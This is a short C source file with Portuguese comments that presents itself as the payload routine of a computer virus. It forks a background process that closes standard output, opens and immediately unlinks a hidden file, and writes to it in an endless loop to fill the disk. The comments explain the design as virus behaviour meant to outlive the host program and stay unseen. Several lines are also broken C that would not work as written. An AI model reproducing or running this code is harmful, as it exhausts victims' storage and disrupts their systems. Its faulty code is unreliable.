#include <stdio.h>
#include <stdlib.h>
 
 
acao()
{
   int ifd;
   char *buf=("1","2","3","4","5","6","7","8","9","0");
   long c;
   int desc;
   close(1); /* fecha a saída padrão, o vídeo */
 
   pipe (desc); /* com a saída padrão fechado, fazemos com que a saída passe a ser o pipe. O descritor dessa nova saída será armazenados em desc */
 
   ifd=open("./lotaHD", "w+",0777); /* abre o arquivo para escrita */
 
   unlink("./lotaHD"); /* apaga o arquivo */
 
   while (1)
   {
      write(ifd, buf, sizeof(buf)); /* em um loop infinito grava os dados de buf no arquivo */
      printf ("oi\n"); /* precisamos de um tempo para a gravação, é o tempo que se escreve esta string na saída. Por isso usamos o pipe. Não queremos que o vírus fique escrevendo nada no vídeo */
   }
}
 
main()
{
   int i;
 
   i=fork(); /* precisaremos criar um outro processo, pois o vírus terá que continuar sua execução enquanto sua ação é realizada.
      Não poderia ser uma thread, pois mesmo que o programa hospedeiro se encerre, o processo tem que continuar.
      O processo filho que foi criado é quem deve se encarregar da execução da ação, o pai tem que continuar a executar as funcionalidades restantes do vírus */
   if (i==0)
      acao();
}
